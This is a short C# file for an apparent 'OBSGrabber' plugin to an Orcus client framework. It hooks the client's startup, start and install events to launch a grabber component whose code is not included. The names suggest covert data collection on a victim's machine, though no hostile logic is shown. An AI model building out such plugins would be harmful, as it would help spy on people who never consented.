using Orcus.Plugins;

namespace OBSGrabber
{
    public class Plugin : ClientController
    {
        private OBSGrabber _obsGrabber;

        public override bool InfluenceStartup(IClientStartup clientStartup)
        {
            _obsGrabber = new OBSGrabber();
            return _obsGrabber.InfluenceStartup(clientStartup);
        }

        public override void Start()
        {
            _obsGrabber = new OBSGrabber();
            _obsGrabber.Start();
        }

        public override void Install(string executablePath)
        {
            _obsGrabber = new OBSGrabber();
            _obsGrabber.Start();
        }
    }
}